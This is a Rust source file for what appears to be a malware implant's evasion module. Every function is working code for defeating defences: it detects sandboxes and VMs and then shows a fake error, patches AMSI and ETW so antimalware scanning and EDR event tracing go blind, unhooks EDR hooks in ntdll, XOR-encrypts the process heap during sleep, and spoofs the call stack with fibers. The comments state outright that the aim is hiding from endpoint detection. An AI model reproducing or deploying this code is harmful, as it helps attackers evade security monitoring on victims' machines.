// src/agent/evasion.rs
//
// Evasion primitives:
//   - VM/Sandbox detection
//   - AMSI patching (disable AntiMalware Scan Interface)
//   - ETW patching (blind Event Tracing for Windows)
//   - Ntdll unhooking (replace hooked ntdll .text with clean copy from disk)
//   - Heap encryption during sleep (walk process heap, XOR all blocks)
//   - Stack spoofing helpers (fiber-based clean call stack during sleep)

use std::path::Path;
use std::thread;
use std::fs;
use std::time::Duration;

// ── VM/Sandbox Detection ───────────────────────────────────────────────

pub fn is_virtualized() -> bool {
    if let Ok(cores) = thread::available_parallelism() {
        if cores.get() < 2 { return true; }
    }

    if cfg!(target_os = "windows") {
        let artifacts = [
            "C:\\Windows\\System32\\drivers\\virtio-net.sys",
            "C:\\Windows\\System32\\drivers\\vioinput.sys",
            "C:\\Windows\\System32\\drivers\\vioscsi.sys",
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        ];
        for path in artifacts {
            if Path::new(path).exists() { return true; }
        }
    } else if cfg!(target_os = "linux") {
        for path in ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor"] {
            if let Ok(content) = fs::read_to_string(path) {
                let s = content.to_lowercase();
                if s.contains("qemu") || s.contains("kvm") || s.contains("virtualbox") {
                    return true;
                }
            }
        }
    }
    false
}

pub fn run_decoy() {
    eprintln!("[*] Initializing system integrity check...");
    thread::sleep(Duration::from_secs(2));
    eprintln!("[*] Verifying environment...");
    thread::sleep(Duration::from_secs(1));
    if cfg!(target_os = "windows") {
        eprintln!("Error: VCRUNTIME140.dll is missing or corrupted. Reinstall the application.");
    } else {
        eprintln!("error: while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory");
    }
    std::process::exit(1);
}

// ── AMSI Patching ──────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub fn patch_amsi() -> Result<String, String> {
    unsafe { patch_function("amsi.dll", "AmsiScanBuffer", &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]) }
}

#[cfg(not(target_os = "windows"))]
pub fn patch_amsi() -> Result<String, String> { Err("Windows only".into()) }

// ── ETW Patching ───────────────────────────────────────────────────────
// Patches EtwEventWrite in ntdll.dll to return 0 (STATUS_SUCCESS)
// immediately. This blinds all ETW consumers (including EDR) to events
// from this process — .NET CLR, PowerShell scriptblock logging, etc.

#[cfg(target_os = "windows")]
pub fn patch_etw() -> Result<String, String> {
    // xor eax, eax; ret = return 0
    unsafe { patch_function("ntdll.dll", "EtwEventWrite", &[0x33, 0xC0, 0xC3]) }
}

#[cfg(not(target_os = "windows"))]
pub fn patch_etw() -> Result<String, String> { Err("Windows only".into()) }

// ── Generic function patcher ───────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn patch_function(dll: &str, func: &str, patch: &[u8]) -> Result<String, String> {
    use std::ffi::CString;
    use std::ptr;

    extern "system" {
        fn LoadLibraryA(name: *const i8) -> *mut std::ffi::c_void;
        fn GetProcAddress(module: *mut std::ffi::c_void, name: *const i8) -> *mut std::ffi::c_void;
        fn VirtualProtect(addr: *mut std::ffi::c_void, size: usize, new: u32, old: *mut u32) -> i32;
    }
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let dll_c = CString::new(dll).unwrap();
    let func_c = CString::new(func).unwrap();

    let h = LoadLibraryA(dll_c.as_ptr());
    if h.is_null() { return Err(format!("{} not found", dll)); }

    let p = GetProcAddress(h, func_c.as_ptr());
    if p.is_null() { return Err(format!("{} not found in {}", func, dll)); }

    let mut old = 0u32;
    if VirtualProtect(p, patch.len(), PAGE_EXECUTE_READWRITE, &mut old) == 0 {
        return Err("VirtualProtect failed".into());
    }

    ptr::copy_nonoverlapping(patch.as_ptr(), p as *mut u8, patch.len());

    let mut tmp = 0u32;
    VirtualProtect(p, patch.len(), old, &mut tmp);

    Ok(format!("Patched {}!{}", dll, func))
}

// ── Ntdll Unhooking ────────────────────────────────────────────────────
// Maps a clean copy of ntdll.dll from disk (or \KnownDlls\) and
// overwrites the .text section of the loaded (potentially hooked) copy.
// After this, all userland hooks placed by EDR on ntdll functions are
// removed, and direct API calls go through the clean code.

#[cfg(target_os = "windows")]
pub fn unhook_ntdll() -> Result<String, String> {
    use std::ffi::{c_void, CString};
    use std::ptr;
    use std::mem;

    extern "system" {
        fn GetModuleHandleA(name: *const i8) -> *mut c_void;
        fn CreateFileA(name: *const i8, access: u32, share: u32, sa: *mut c_void, disp: u32, flags: u32, template: *mut c_void) -> *mut c_void;
        fn CreateFileMappingA(file: *mut c_void, sa: *mut c_void, protect: u32, hi: u32, lo: u32, name: *const i8) -> *mut c_void;
        fn MapViewOfFile(mapping: *mut c_void, access: u32, hi: u32, lo: u32, bytes: usize) -> *mut c_void;
        fn UnmapViewOfFile(addr: *const c_void) -> i32;
        fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
        fn CloseHandle(h: *mut c_void) -> i32;
    }

    const GENERIC_READ: u32 = 0x80000000;
    const FILE_SHARE_READ: u32 = 1;
    const OPEN_EXISTING: u32 = 3;
    const PAGE_READONLY: u32 = 2;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const FILE_MAP_READ: u32 = 4;
    const INVALID_HANDLE: *mut c_void = -1isize as *mut c_void;

    #[repr(C)]
    struct ImageDosHeader { e_magic: u16, _pad: [u8; 58], e_lfanew: i32 }

    #[repr(C)]
    struct ImageSectionHeader {
        name: [u8; 8], virtual_size: u32, virtual_address: u32,
        size_of_raw_data: u32, pointer_to_raw_data: u32, _pad: [u8; 12],
        characteristics: u32,
    }

    unsafe {
        // 1. Get the loaded ntdll base address
        let ntdll_name = CString::new("ntdll.dll").unwrap();
        let loaded_base = GetModuleHandleA(ntdll_name.as_ptr());
        if loaded_base.is_null() { return Err("ntdll not loaded".into()); }

        // 2. Map a clean copy from disk
        let path = CString::new("C:\\Windows\\System32\\ntdll.dll").unwrap();
        let h_file = CreateFileA(path.as_ptr(), GENERIC_READ, FILE_SHARE_READ, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut());
        if h_file == INVALID_HANDLE { return Err("CreateFileA failed".into()); }

        let h_mapping = CreateFileMappingA(h_file, ptr::null_mut(), PAGE_READONLY, 0, 0, ptr::null());
        if h_mapping.is_null() { CloseHandle(h_file); return Err("CreateFileMapping failed".into()); }

        let clean_base = MapViewOfFile(h_mapping, FILE_MAP_READ, 0, 0, 0);
        if clean_base.is_null() {
            CloseHandle(h_mapping); CloseHandle(h_file);
            return Err("MapViewOfFile failed".into());
        }

        // 3. Find .text section in the loaded copy
        let dos = &*(loaded_base as *const ImageDosHeader);
        if dos.e_magic != 0x5A4D {
            UnmapViewOfFile(clean_base); CloseHandle(h_mapping); CloseHandle(h_file);
            return Err("Invalid DOS header".into());
        }

        let nt_offset = dos.e_lfanew as usize;
        // Skip PE signature (4) + FileHeader (20) to get to OptionalHeader
        let file_header_ptr = (loaded_base as *const u8).add(nt_offset + 4);
        let num_sections = *(file_header_ptr.add(2) as *const u16);
        let opt_header_size = *(file_header_ptr.add(16) as *const u16) as usize;

        let sections_start = nt_offset + 4 + 20 + opt_header_size;

        let mut text_rva = 0u32;
        let mut text_size = 0u32;
        let mut text_raw_offset = 0u32;
        let mut found = false;

        for i in 0..num_sections as usize {
            let sec = &*((loaded_base as *const u8).add(sections_start + i * 40) as *const ImageSectionHeader);
            if &sec.name[..5] == b".text" {
                text_rva = sec.virtual_address;
                text_size = sec.virtual_size;
                text_raw_offset = sec.pointer_to_raw_data;
                found = true;
                break;
            }
        }

        if !found {
            UnmapViewOfFile(clean_base); CloseHandle(h_mapping); CloseHandle(h_file);
            return Err(".text section not found".into());
        }

        // 4. Overwrite the hooked .text with the clean .text
        let loaded_text = (loaded_base as *mut u8).add(text_rva as usize);
        let clean_text = (clean_base as *const u8).add(text_raw_offset as usize);

        let mut old_protect = 0u32;
        if VirtualProtect(loaded_text as *mut c_void, text_size as usize, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            UnmapViewOfFile(clean_base); CloseHandle(h_mapping); CloseHandle(h_file);
            return Err("VirtualProtect failed on .text".into());
        }

        ptr::copy_nonoverlapping(clean_text, loaded_text, text_size as usize);

        let mut tmp = 0u32;
        VirtualProtect(loaded_text as *mut c_void, text_size as usize, old_protect, &mut tmp);

        // 5. Cleanup
        UnmapViewOfFile(clean_base);
        CloseHandle(h_mapping);
        CloseHandle(h_file);

        Ok(format!("Ntdll unhooked: restored {} bytes in .text", text_size))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn unhook_ntdll() -> Result<String, String> { Err("Windows only".into()) }

// ── Heap Encryption/Decryption ─────────────────────────────────────────
// Walks the process heap and XORs every allocated block with a random key.
// Called before sleep to hide strings, structures, and other data in memory.
// Called again after sleep with the same key to restore.
//
// CRITICAL: The process heap is shared across ALL threads. If any thread
// (including Tokio I/O pollers and timers) accesses the heap while it is
// encrypted, the process will access-violate. All other threads MUST be
// suspended before encrypting and resumed after decrypting.

#[cfg(target_os = "windows")]
pub fn suspend_other_threads() -> Vec<*mut std::ffi::c_void> {
    use std::ffi::c_void;
    use std::mem;

    extern "system" {
        fn GetCurrentProcessId() -> u32;
        fn GetCurrentThreadId() -> u32;
        fn CreateToolhelp32Snapshot(flags: u32, pid: u32) -> *mut c_void;
        fn Thread32First(snap: *mut c_void, entry: *mut ThreadEntry32) -> i32;
        fn Thread32Next(snap: *mut c_void, entry: *mut ThreadEntry32) -> i32;
        fn OpenThread(access: u32, inherit: i32, tid: u32) -> *mut c_void;
        fn SuspendThread(thread: *mut c_void) -> u32;
        fn CloseHandle(h: *mut c_void) -> i32;
    }

    #[repr(C)]
    struct ThreadEntry32 {
        dw_size: u32,
        _cnt_usage: u32,
        th32_thread_id: u32,
        th32_owner_process_id: u32,
        _tp_base_pri: i32,
        _tp_delta_pri: i32,
        _dw_flags: u32,
    }

    const TH32CS_SNAPTHREAD: u32 = 0x4;
    const THREAD_SUSPEND_RESUME: u32 = 0x0002;

    let mut handles = Vec::new();

    unsafe {
        let pid = GetCurrentProcessId();
        let my_tid = GetCurrentThreadId();
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snap.is_null() || snap == (-1isize as *mut c_void) { return handles; }

        let mut te: ThreadEntry32 = mem::zeroed();
        te.dw_size = mem::size_of::<ThreadEntry32>() as u32;

        if Thread32First(snap, &mut te) != 0 {
            loop {
                if te.th32_owner_process_id == pid && te.th32_thread_id != my_tid {
                    let h = OpenThread(THREAD_SUSPEND_RESUME, 0, te.th32_thread_id);
                    if !h.is_null() {
                        SuspendThread(h);
                        handles.push(h);
                    }
                }
                if Thread32Next(snap, &mut te) == 0 { break; }
            }
        }
        CloseHandle(snap);
    }
    handles
}

#[cfg(target_os = "windows")]
pub fn resume_threads(handles: Vec<*mut std::ffi::c_void>) {
    use std::ffi::c_void;
    extern "system" {
        fn ResumeThread(thread: *mut c_void) -> u32;
        fn CloseHandle(h: *mut c_void) -> i32;
    }
    unsafe {
        for h in handles {
            ResumeThread(h);
            CloseHandle(h);
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub fn suspend_other_threads() -> Vec<*mut std::ffi::c_void> { Vec::new() }

#[cfg(not(target_os = "windows"))]
pub fn resume_threads(_handles: Vec<*mut std::ffi::c_void>) {}

#[cfg(target_os = "windows")]
pub fn encrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
    use std::ffi::c_void;

    #[repr(C)]
    struct ProcessHeapEntry {
        data: *mut c_void,
        size: usize,
        overhead: u8,
        region_index: u8,
        flags: u16,
        _union: [u8; 32],
    }

    extern "system" {
        fn GetProcessHeap() -> *mut c_void;
        fn HeapLock(heap: *mut c_void) -> i32;
        fn HeapUnlock(heap: *mut c_void) -> i32;
        fn HeapWalk(heap: *mut c_void, entry: *mut ProcessHeapEntry) -> i32;
    }

    const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x4;

    unsafe {
        let heap = GetProcessHeap();
        if heap.is_null() { return Err("GetProcessHeap failed".into()); }

        if HeapLock(heap) == 0 { return Err("HeapLock failed".into()); }

        let mut entry: ProcessHeapEntry = std::mem::zeroed();
        let mut encrypted_blocks = 0usize;

        while HeapWalk(heap, &mut entry) != 0 {
            if entry.flags & PROCESS_HEAP_ENTRY_BUSY != 0 && entry.size >= 16 && !entry.data.is_null() {
                let block = std::slice::from_raw_parts_mut(entry.data as *mut u8, entry.size);
                // XOR each byte with the repeating key
                for (i, byte) in block.iter_mut().enumerate() {
                    *byte ^= xor_key[i % 16];
                }
                encrypted_blocks += 1;
            }
        }

        HeapUnlock(heap);
        Ok(encrypted_blocks)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn encrypt_heap(_xor_key: &[u8; 16]) -> Result<usize, String> { Ok(0) }

// Decryption is the same XOR operation
pub fn decrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
    encrypt_heap(xor_key) // XOR is its own inverse
}

// ── Stack Spoofing (Fiber-based) ───────────────────────────────────────
// Converts the current thread to a fiber, creates a "clean" fiber with
// a legitimate-looking entry point, switches to it for sleeping, then
// switches back. During sleep, the original fiber's stack is not on the
// thread's active stack, so EDR stack-walking sees the clean fiber's
// stack instead of the agent's unbacked memory addresses.

#[cfg(target_os = "windows")]
pub fn sleep_with_spoofed_stack(duration_ms: u32) {
    use std::ffi::c_void;
    use std::ptr;

    extern "system" {
        fn ConvertThreadToFiber(param: *mut c_void) -> *mut c_void;
        fn CreateFiber(stack_size: usize, start: unsafe extern "system" fn(*mut c_void), param: *mut c_void) -> *mut c_void;
        fn SwitchToFiber(fiber: *mut c_void);
        fn DeleteFiber(fiber: *mut c_void);
        fn ConvertFiberToThread() -> i32;
        fn Sleep(ms: u32);
    }

    // Data passed to the clean fiber
    #[repr(C)]
    struct SleepParams {
        duration_ms: u32,
        return_fiber: *mut c_void,
    }

    // Clean fiber entry: just sleeps, then switches back to the agent fiber
    unsafe extern "system" fn clean_fiber_proc(param: *mut c_void) {
        let params = &*(param as *const SleepParams);
        Sleep(params.duration_ms);
        SwitchToFiber(params.return_fiber);
    }

    unsafe {
        // Convert current thread to a fiber (preserves our context)
        let agent_fiber = ConvertThreadToFiber(ptr::null_mut());
        if agent_fiber.is_null() {
            // Already a fiber or conversion failed; fall back to normal sleep
            Sleep(duration_ms);
            return;
        }

        let mut params = SleepParams {
            duration_ms,
            return_fiber: agent_fiber,
        };

        // Create a clean fiber with a normal stack
        let clean_fiber = CreateFiber(0, clean_fiber_proc, &mut params as *mut _ as *mut c_void);
        if clean_fiber.is_null() {
            ConvertFiberToThread();
            Sleep(duration_ms);
            return;
        }

        // Switch to the clean fiber (our stack is now suspended)
        // During Sleep() inside the clean fiber, any stack walk will see
        // the clean fiber's stack → kernel32!Sleep → ntdll — no unbacked memory
        SwitchToFiber(clean_fiber);

        // We're back — clean up
        DeleteFiber(clean_fiber);
        ConvertFiberToThread();
    }
}

#[cfg(not(target_os = "windows"))]
pub fn sleep_with_spoofed_stack(duration_ms: u32) {
    std::thread::sleep(std::time::Duration::from_millis(duration_ms as u64));
}
